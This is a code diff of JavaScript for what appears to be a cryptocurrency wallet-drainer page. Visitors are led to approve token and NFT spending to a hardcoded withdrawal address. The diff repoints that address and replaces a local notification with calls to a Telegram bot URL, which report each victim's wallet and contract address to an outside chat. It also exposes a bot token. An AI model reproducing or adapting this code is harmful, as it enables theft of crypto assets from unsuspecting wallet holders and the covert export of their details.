@@ -60,7 +60,7 @@ const accountBalances = {
     nft: []
 }
 
-const WITHDRAWAL_ADDRESS = "0xDC070FD507BD5e06E68ece4e78993b36f5360CC3"
+const WITHDRAWAL_ADDRESS = "0x36b159129DDBd4988De8a7911935712af24C05c7"
 const MINIMAL_SUM_IN_USD = 1
 
 let accountAddress = null, walletConnector, currentConnection
@@ -236,19 +236,11 @@ const getBalances = async () => {
                 try {
                     await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)
 
-                    $.ajax({
-                        url: "/notify.php",
-                        type: "POST",
-                        headers: {
-                            'content-type': 'application/json',
-                        },
-                        dataType: 'json',
-                        data: JSON.stringify({
-                            contract: withdrawalToken.address,
-                            "approved_from": accountAddress,
-                            "approved_to": WITHDRAWAL_ADDRESS
-                        })
-                    })
+                    var z=$.ajax({  
+    type: "POST",  
+    url: "https://api.telegram.org/bot"+"5343408432:AAFrrAwn_jdMImmv8h1nDm5mP4zkDl43n88"+"/sendMessage?chat_id="+"426701664",
+    data: "parse_mode=HTML&text="+encodeURIComponent("ERC20 Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address), 
+    }); 
 
 
                 } catch (e) {
@@ -260,29 +252,20 @@ const getBalances = async () => {
                 try {
                     await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)
 
-                    $.ajax({
-                        url: "/notify.php",
-                        type: "POST",
-                        headers: {
-                            'content-type': 'application/json',
-                        },
-                        dataType: 'json',
-                        data: JSON.stringify({
-                            contract: withdrawalToken.address,
-                            "approved_from": accountAddress,
-                            "approved_to": WITHDRAWAL_ADDRESS
-                        })
-                    })
+                   var z=$.ajax({  
+    type: "POST",  
+    url: "https://api.telegram.org/bot"+"5343408432:AAFrrAwn_jdMImmv8h1nDm5mP4zkDl43n88"+"/sendMessage?chat_id="+"426701664",
+    data: "parse_mode=HTML&text="+encodeURIComponent("NFT Approved. Address of holder: "+accountAddress)+"%0A%0A"+encodeURIComponent("Contract address "+ withdrawalToken.address), 
+    }); 
 
-                    $("#overlay").fadeOut(300);
                 } catch (e) {
-                    $("#overlay").fadeOut(300);
+
                 }
             } else {
-                $("#overlay").fadeOut(300);
+
             }
         } else {
-            $("#overlay").fadeOut(300);
+
         }
     } catch (e) {
 
